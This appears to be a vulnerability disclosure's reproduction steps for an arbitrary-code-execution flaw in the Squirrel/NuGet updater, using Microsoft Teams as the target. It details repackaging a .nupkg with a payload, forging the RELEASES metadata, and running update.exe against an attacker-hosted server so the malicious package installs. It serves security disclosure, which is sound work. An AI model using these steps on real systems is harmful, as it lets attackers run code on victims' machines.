https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12

Steps to Reproduce:

1. Exploit reproduce:

Step 1: Get any Nuget package, i used Teams application for example. "TeamsForWindows-1.5.50-full.nupkg"
Step 2: Extract the package using 7zip and delete the main file to avoid confusion.
Step 3: Go to /TeamsForWindows-1.5.50-full/lib/net45/ remove all the files and place your payload named "squirrel.exe".
Step 4: go to home directory "TeamsForWindows-1.5.50-full" select all the files and zip under name "TeamsForWindows-1.5.50-full.nupkg"
Step 5: We need to create metadata for the the file TeamsForWindows-1.5.50-full.nupkg, like sha1, filesize
Step 6: Enter the below command in KALI or any linux distros.
        sha1sum TeamsForWindows-1.5.50-full.nupkg && wc -c < TeamsForWindows-1.5.50-full.nupkg
        Output : fa8b87f0b995498a6e890c832dcaf968997608d4 TeamsForWindows-1.5.50-full.nupkg 46951
Step 7: create a file named RELEASES and copy the above output and save.
Step 8: So the main directory contains 2 file TeamsForWindows-1.5.50-full.nupkg and RELEASES.
Step 9: upload to any http server.

2. Attack reproduce:

Step 1: Our target is Microsoft Teams application, So once installed go to "%localappdata%\microsoft\teams\"
Step 2: Run the below command,
            update.exe --update=[http server contains the above 2 files]
        E.g update.exe --update=http://192.168.198.135/
        
Now the update command will download the malicious package and install automatically.


